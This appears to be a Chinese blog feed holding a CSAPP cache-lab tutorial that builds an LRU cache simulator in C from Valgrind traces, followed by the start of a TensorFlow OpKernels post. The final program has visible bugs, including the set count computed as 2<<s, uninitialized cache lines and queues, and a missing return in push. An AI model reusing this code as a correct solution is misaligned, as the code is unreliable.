<h3 id="Trance-File"><a href="#Trance-File" class="headerlink" title="Trance File"></a>Trance File</h3><p>要写这样一个缓存模拟器，我们肯定首先要了解输入的内容。Valgrind的<code>--trace-mem=yes</code>选项可以追踪内存：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ valgrind --log-fd=1 --tool=lackey -v --trace-mem=yes ls -l</span><br><span class="line"></span><br><span class="line"> L 04224488,4</span><br><span class="line">I  0400a0ab,8</span><br><span class="line"> S ffefffdf8,8</span><br><span class="line">I  0400a0b3,5</span><br><span class="line"> M ffefffd48,8</span><br></pre></td></tr></table></figure>
<p>上面这个命令用valgrind打印出了在执行<code>ls -l</code>过程中内存的使用情况。输出的格式是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[空格] 操作符(I/L/S/M) 地址, 字节大小</span><br><span class="line">[space] operator(I/L/S/M) address, size</span><br></pre></td></tr></table></figure>
<p>操作符有四种I/L/S/M，分别代表指令加载(I)/数据加载(L)/数据存储(S)/M(数据修改)。其中指令加载(I)前面没有空格。</p>
<h3 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h3><p>接下来还需要了解命令行参数，缓存模拟器可以根据命令行参数设置成不同的规格。例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./csim-ref -s 4 -E 1 -b 4</span><br></pre></td></tr></table></figure>
<p>其中<code>-s, -E, -b</code>分别表示：</p>
<ul>
<li><code>-s &lt;s&gt;</code> 有$S=2^s$个组，</li>
<li><code>-E &lt;E&gt;</code> E个相联度，即每组E行</li>
<li><code>-b &lt;b&gt;</code> 每一行是由一个$B=2^b$字节的数据块组成。</li>
</ul>
<p>所以<code>-s 4 -E 1 -b 4</code>表示，高速缓存有16个组，每组1行，每一行是由一个16个字节的数据块组成的。</p>
<p>解析命令行参数可以使用<code>getopt</code>函数，在使用时包含<code>unistd.h</code>头文件。可使用<code>man 3 getopt</code>查询函数用法和示例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getopt -- get option character from command line argument list</span><br><span class="line">getopt(int argc, char * const argv[], const char *optstring);</span><br></pre></td></tr></table></figure>
<p>字符串<code>optstring</code>可以下列元素，</p>
<ul>
<li>单个字符，表示选项，</li>
<li>单个字符后接一个冒号：表示该选项后必须跟一个参数。参数紧跟在选项后或者以空格隔开。该参数的指针赋给optarg。</li>
<li>单个字符后跟两个冒号, 这时选项的参数是可选的(可有可无)。有参数时，参数与选项之间不能有空格</li>
</ul>
<p>所以输入时的处理可以如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">while((opt=getopt(argc, argv, &quot;s:E:b:t:v::&quot;)) != -1)</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;-%c %s &quot;, opt, optarg);</span><br><span class="line">	switch (opt)</span><br><span class="line">	&#123;</span><br><span class="line">		case &apos;s&apos;:</span><br><span class="line">			s = atoi(optarg);</span><br><span class="line">			break;</span><br><span class="line">		case &apos;E&apos;:</span><br><span class="line">			E = atoi(optarg);</span><br><span class="line">			break;</span><br><span class="line">		case &apos;b&apos;:</span><br><span class="line">			b = atoi(optarg);</span><br><span class="line">			break;</span><br><span class="line">		case &apos;t&apos;:</span><br><span class="line">			filename = optarg;</span><br><span class="line">			break;</span><br><span class="line">		default:</span><br><span class="line">			printf(&quot;Wrong argumet \n&quot;);</span><br><span class="line">			break;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>用<code>getopt()</code>函数处理完命令行参数，也就知道了需要模拟的高速缓存的具体细节。下一步就是读取Valgrind文本文件，进行处理。 使用<code>fscanf()</code>函数可以很方便的从文件中读取内容。同样的用<code>man 3 fscanf</code>可以查询<code>fscanf()</code>的具体用法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fscanf</span><span class="params">(FILE *stream, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span>;</span><br></pre></td></tr></table></figure>
<p><code>fscanf()</code>依次输入<code>trace file</code>中的<code>[space]operator/address/size</code>。由于地址的长度大小不一定，所以用<code>malloc()</code>动态分配。<code>fscanf()</code>中的<code>%[^,]</code>表示读入任意多的字符，直到遇到逗号(<code>,</code>)为止。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="built_in">fscanf</span>(fp, <span class="string">" %c %[^,],%c"</span>, &amp;<span class="keyword">operator</span>, address, &amp;size)==<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>注意在调用<code>fscanf()</code>函数时，要确认函数返回值是否等于要赋值的参数数量<code>fscanf()==3</code>。</p>
<h3 id="模拟缓存"><a href="#模拟缓存" class="headerlink" title="模拟缓存"></a>模拟缓存</h3><p>前面的几步都是为了这一步做好准备，现在知道了缓存的细节，读取了<code>trace file</code>, 下一步就是要构造一个缓存了。可以用一个多维数组构造缓存，其中一维表示组，一维表示行，另一维表示块。其实它也就是一个二维的缓存行，每一行有$B$字节，有$S$组，每组$E$行，一共有$S\times E$行。那么，我们先构造一个缓存行，然后再构造一个$S\times E$行的数组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct cacheline &#123;</span><br><span class="line">     int valid_bit; // if 1, valid</span><br><span class="line">     unsigned tag; // tag</span><br><span class="line">     </span><br><span class="line">&#125;</span><br><span class="line">struct cache_line cache[S][E]</span><br></pre></td></tr></table></figure>
<p>接下来的一个难点是如何部署LRU(Least Recently Used replacement policy)策略。一个好的方法是使用队列, 在节点中存放地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUEUE_TYPE cacheline</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* define node of queue*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">queue_node</span> &#123;</span></span><br><span class="line">	QUEUE_TYPE* value;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">queue_node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125; node;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* define a queue */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> size;</span><br><span class="line">	<span class="keyword">int</span> full_size;</span><br><span class="line">	node *head;</span><br><span class="line">	node *tail;</span><br><span class="line">&#125; <span class="built_in">queue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create a queue */</span></span><br><span class="line"><span class="function"><span class="built_in">queue</span>* <span class="title">create_queue</span><span class="params">(<span class="built_in">queue</span>* q, <span class="keyword">int</span> full_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	q = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">queue</span>));</span><br><span class="line">	<span class="keyword">if</span> (q==<span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Memory error"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	q-&gt;size = <span class="number">0</span>;</span><br><span class="line">	q-&gt;full_size = full_size;</span><br><span class="line">	<span class="keyword">return</span> q;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pop_queue */</span></span><br><span class="line"><span class="function">QUEUE_TYPE* <span class="title">pop</span><span class="params">(<span class="built_in">queue</span> *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	node *old_head;</span><br><span class="line">	QUEUE_TYPE* old_value; </span><br><span class="line">	old_head = q-&gt;head;</span><br><span class="line">	q-&gt;head = q-&gt;head-&gt;next;</span><br><span class="line">	q-&gt;size -= <span class="number">1</span>;</span><br><span class="line">	old_value = old_head-&gt;value;</span><br><span class="line">	<span class="built_in">free</span>(old_head);</span><br><span class="line">	<span class="keyword">return</span> old_value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* queue is empty */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">is_empty</span><span class="params">(<span class="built_in">queue</span> *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (q-&gt;size == <span class="number">0</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* queue is full */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">is_full</span><span class="params">(<span class="built_in">queue</span> *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (q-&gt;size == q-&gt;full_size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* destory_queue */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">destroy</span><span class="params">(<span class="built_in">queue</span> *q)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="keyword">while</span> (!is_empty(q))</span><br><span class="line">		pop(q);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* push_queuq */</span></span><br><span class="line"><span class="function">QUEUE_TYPE* <span class="title">push</span><span class="params">(<span class="built_in">queue</span> *q, QUEUE_TYPE* value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* create a new node */</span></span><br><span class="line">	node *new_node;</span><br><span class="line">	new_node = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(node));</span><br><span class="line">	new_node-&gt;value = value;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (is_empty(q))</span><br><span class="line">	&#123;</span><br><span class="line">		q-&gt;head = new_node;</span><br><span class="line">		q-&gt;tail = new_node;</span><br><span class="line">		q-&gt;size = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">return</span> value;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		q-&gt;tail-&gt;next = new_node;</span><br><span class="line">		q-&gt;tail = new_node;</span><br><span class="line">		q-&gt;size = q-&gt;size + <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span> ((q-&gt;size) &gt; (q-&gt;full_size))</span><br><span class="line">			<span class="keyword">return</span> pop(q);</span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面就是细节的处理了，包括内存分配，从地址中提取标记，组索引，块偏移，把输入的16进制字符串转化为数字。这些都非常简单，最终主程序如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &quot;queue.h&quot;</span><br><span class="line"></span><br><span class="line">/* 将十六进制字符串转换为十进制整数 */</span><br><span class="line">int hexstr2int(char * HexStr)</span><br><span class="line">&#123;</span><br><span class="line">	int iResult = 0, iCycle = 1;</span><br><span class="line"></span><br><span class="line">    //判断字符串是否合法</span><br><span class="line">	if( !strlen( HexStr ) )</span><br><span class="line">	&#123;</span><br><span class="line">		return -1;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    //指针变量p指向字符串的末尾</span><br><span class="line">	char * p = HexStr + strlen( HexStr );</span><br><span class="line"></span><br><span class="line">	while( (--p+1) != HexStr )</span><br><span class="line">	&#123;</span><br><span class="line">		if ( *p &gt;= &apos;0&apos; &amp;&amp; *p &lt;= &apos;9&apos; )</span><br><span class="line">			iResult += ( *p - &apos;0&apos; )*iCycle;</span><br><span class="line">		else if ( *p &gt;= &apos;A&apos; &amp;&amp; *p &lt;= &apos;F&apos; )</span><br><span class="line">			iResult += ( *p - &apos;A&apos; + 10 )*iCycle;</span><br><span class="line">		else if ( *p &gt;= &apos;a&apos; &amp;&amp; *p &lt;= &apos;f&apos; )</span><br><span class="line">			iResult += ( *p - &apos;a&apos; + 10 )*iCycle;</span><br><span class="line">		iCycle &lt;&lt;= 4;</span><br><span class="line">	&#125;</span><br><span class="line">	return iResult;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">	int opt;</span><br><span class="line">	int s, E, b; /* cache parameter */</span><br><span class="line">	int S, B;</span><br><span class="line">	int miss=0, hit=0, eviction=0; /* count on miss/hit/eviction */</span><br><span class="line">	int i, j, flag=0; /* dummy variable */</span><br><span class="line">	char *filename;</span><br><span class="line">	queue *q, *qi; </span><br><span class="line"></span><br><span class="line">	cacheline **cache; // every cache has S set, every set has E lines</span><br><span class="line">	cacheline cacheij, *cacheij_address; //dummy variable</span><br><span class="line"></span><br><span class="line">	FILE *fp;</span><br><span class="line">	char operator, *address, size;</span><br><span class="line">	unsigned d_address, tag, set, bit; // 地址，标记(t)，组索引(s)，块偏移(b) </span><br><span class="line">	</span><br><span class="line">	while((opt=getopt(argc, argv, &quot;s:E:b:t:v::&quot;)) != -1)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;-%c %s &quot;, opt, optarg);</span><br><span class="line">		switch (opt)</span><br><span class="line">		&#123;</span><br><span class="line">			case &apos;s&apos;:</span><br><span class="line">			s = atoi(optarg);</span><br><span class="line">			break;</span><br><span class="line">			case &apos;E&apos;:</span><br><span class="line">			E = atoi(optarg);</span><br><span class="line">			break;</span><br><span class="line">			case &apos;b&apos;:</span><br><span class="line">			b = atoi(optarg);</span><br><span class="line">			break;</span><br><span class="line">			case &apos;t&apos;:</span><br><span class="line">			filename = optarg;</span><br><span class="line">			break;</span><br><span class="line">			default:</span><br><span class="line">			printf(&quot;Wrong argumet \n&quot;);</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">	S = 2 &lt;&lt; s;</span><br><span class="line">	B = 2 &lt;&lt; b;</span><br><span class="line"></span><br><span class="line">	/* allocate memory */</span><br><span class="line">	cache = (cacheline **) malloc(sizeof(cacheline*) *S);</span><br><span class="line">	address = (char *) malloc(sizeof(char) * 16);</span><br><span class="line">	q = (queue *) malloc(sizeof(queue) * S);</span><br><span class="line">	for (qi=q, i=0; i&lt;S; qi++, i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cache[i] = (cacheline *) malloc(sizeof(cacheline) *E); /* 每一个缓存组都有E个缓存行 */</span><br><span class="line">		qi-&gt;full_size = E;</span><br><span class="line">		for (j=0; j&lt; E; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			/* 设定缓存行 */</span><br><span class="line">			cacheij = cache[i][j];</span><br><span class="line">			cacheij.valid_bit = 0;</span><br><span class="line">			cacheij.tag = i*E+j;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    /* open file */</span><br><span class="line">	fp = fopen(filename, &quot;r&quot;);</span><br><span class="line">	if(fp == NULL)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;Open filefailure!&quot;);</span><br><span class="line">		exit(1);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		/* read trace data */</span><br><span class="line">		while(fscanf(fp, &quot; %c %[^,],%c&quot;, &amp;operator, address, &amp;size)==3)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;%c %s,%c &quot;, operator, address, size);</span><br><span class="line"></span><br><span class="line">			/* process address */</span><br><span class="line">			d_address = hexstr2int(address);</span><br><span class="line">			tag = d_address &gt;&gt; (b+s); /* 标记t */</span><br><span class="line">			set = (d_address &amp; ((1&lt;&lt;(b+s))-1)) &gt;&gt; b; /* 组索引s */</span><br><span class="line">			bit = (d_address) &amp; ((1&lt;&lt;b)-1); /* 块偏移b, 其实模拟时没用，但还是写上 */</span><br><span class="line">			printf(&quot;     address: %x, tag:%d, set:%d, bit:%d     &quot;, d_address, tag, set, bit);</span><br><span class="line"></span><br><span class="line">			/* 找到缓存行，根据操作符（I，L，S，M)，进行操作 */</span><br><span class="line">			if (operator == &apos;L&apos; || operator == &apos;S&apos; || operator == &apos;M&apos;)</span><br><span class="line">			&#123;</span><br><span class="line">					/* 首先根据标记，找到行 */</span><br><span class="line">					flag = 0; /* if flag=0, we didn&apos;t find it */</span><br><span class="line">				for (i=0; i&lt;E; i++)</span><br><span class="line">				&#123;</span><br><span class="line">					cacheij_address = &amp;cache[set][i];</span><br><span class="line">					if ((cacheij_address-&gt;tag == tag) &amp; (cacheij_address-&gt;valid_bit))</span><br><span class="line">						/* OK, find it */</span><br><span class="line">					&#123;</span><br><span class="line">						flag = 1;</span><br><span class="line">						hit += 1;</span><br><span class="line">						printf(&quot;hit &quot;);</span><br><span class="line">						break;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				if (!flag)</span><br><span class="line">				&#123;</span><br><span class="line">					/* we can&apos;t find it! */</span><br><span class="line">					printf(&quot;miss &quot;);</span><br><span class="line">					miss += 1;</span><br><span class="line">						/* set is full or not */</span><br><span class="line">					if (is_full(&amp;q[set]))</span><br><span class="line">					&#123;</span><br><span class="line">							/* it&apos;s full, pop a cache_line, fill in and push it */</span><br><span class="line">						cacheij_address	= pop(&amp;q[set]);</span><br><span class="line">						cacheij_address-&gt;tag = tag;</span><br><span class="line">						push(&amp;q[set], cacheij_address);</span><br><span class="line">						eviction += 1;</span><br><span class="line">						printf(&quot;eviction &quot;);</span><br><span class="line">					&#125;</span><br><span class="line">					else</span><br><span class="line">					&#123;</span><br><span class="line">							/* find the uncached cache_line, and fill in */</span><br><span class="line">						for (i=0; i&lt;E; i++)</span><br><span class="line">						&#123;</span><br><span class="line">							cacheij_address = &amp;cache[set][i];</span><br><span class="line">							if (!cacheij_address-&gt;valid_bit)</span><br><span class="line">							&#123;</span><br><span class="line">								cacheij_address-&gt;tag = tag;</span><br><span class="line">								cacheij_address-&gt;valid_bit = 1;</span><br><span class="line">								push(&amp;q[set], cacheij_address);</span><br><span class="line">								break;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line">					/* if &quot;M&quot; */</span><br><span class="line">				if 	(operator == &apos;M&apos;)</span><br><span class="line">				&#123;</span><br><span class="line">					hit += 1;</span><br><span class="line">					printf(&quot;hit &quot;);</span><br><span class="line">				&#125;		</span><br><span class="line">			&#125;</span><br><span class="line">			printf(&quot;\n&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printf(&quot;hits:%d misses:%d evictions:%d&quot;, hit, miss, eviction);</span><br><span class="line">	//free the memory of cache</span><br><span class="line">	for (i=0; i&lt;S; i++)</span><br><span class="line">		free(cache[i]);</span><br><span class="line">	free(address);</span><br><span class="line">	fclose(fp);</span><br><span class="line">	</span><br><span class="line">	//printSummary(0, 0, 0);</span><br><span class="line">	return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> CSAPP Lab </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[4 TF OpKernels简介]]></title>
      <url>/wiki/2017/12/30/TensorFlow-4-OpKernels%E7%AE%80%E4%BB%8B/</url>
      <content type="html"><![CDATA[<p><code>OpKernel</code>类（core/framework/op_kernel.h）是所有Op类的基类。继承<code>OpKernel</code>还可以自定义新的Op类。用的较多的Op如（MatMul,  Conv2D,  SoftMax,  AvgPooling, Argmax等）。</p>
<p>所有Op包含注册（Register Op）和实现（正向计算、梯度定义）两部分。</p>
<p>所有Op类的实现需要overide抽象基函数 void Compute(OpKernelContext* context)，实现自身Op功能。用户可以根据需要自定义新的Op操作，参考[12]。</p>
<p>TF中所有Op操作的属性定义和描述都在 <code>ops/ops.pbtxt</code>。如下Add操作，定义了输入参数x、y，输出参数z。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148888986528.jpg" alt=""></p>
<h2 id="4-2-UnaryOp-amp-BinaryOp"><a href="#4-2-UnaryOp-amp-BinaryOp" class="headerlink" title="4.2 UnaryOp &amp; BinaryOp"></a>4.2 UnaryOp &amp; BinaryOp</h2><p>UnaryOp和BinaryOp定义了简单的一元操作和二元操作，类定义在/core/kernels/ cwise_ops.h文件，类实现在/core/kernels/cwise<em>op</em>*.cc类型的文件中，如cwise_op_sin.cc文件。</p>
<p>一元操作全称为Coefficient-wise unary operations，一元运算有abs， sqrt， exp， sin， cos，conj（共轭）等。如abs的基本定义：</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148889249291.jpg" alt=""></p>
<p>二元操作全称为Coefficient-wise binary operations，二元运算有add，sub， div， mul，mod等。如sum的基本定义：</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148889292844.jpg" alt=""></p>
<h2 id="4-3-MatMul"><a href="#4-3-MatMul" class="headerlink" title="4.3 MatMul"></a>4.3 MatMul</h2><h3 id="4-3-1-Python相关部分"><a href="#4-3-1-Python相关部分" class="headerlink" title="4.3.1 Python相关部分"></a>4.3.1 Python相关部分</h3><p>在Python脚本中定义matmul运算：</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148889481292.jpg" alt=""></p>
<p>根据Ops名称MatMul从Ops库中找出对应Ops类型</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148889531209.jpg" alt=""></p>
<p>创建ops节点</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148889599122.jpg" alt=""></p>
<p>创建ops节点并指定相关属性和设备分配</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/15148889642022.jpg" alt=""></p>
<h3 id="4-3-2-C-相关部分"><a href="#4-3-2-C-相关部分" class="headerlink" title="4.3.2 C++相关部分"></a>4.3.2 C++相关部分</h3><p>Python脚本通过swig调用进入C接口API文件core/client/tensor_c_api.cc，调用TF_NewNode函数生成节点，同时还需要指定输入变量，TF_AddInput函数设置first输入变量，TF_AddInputList函数设置other输入变量。这里op_type为MatMul，first输入变量为a，other输入变量为b。</p>
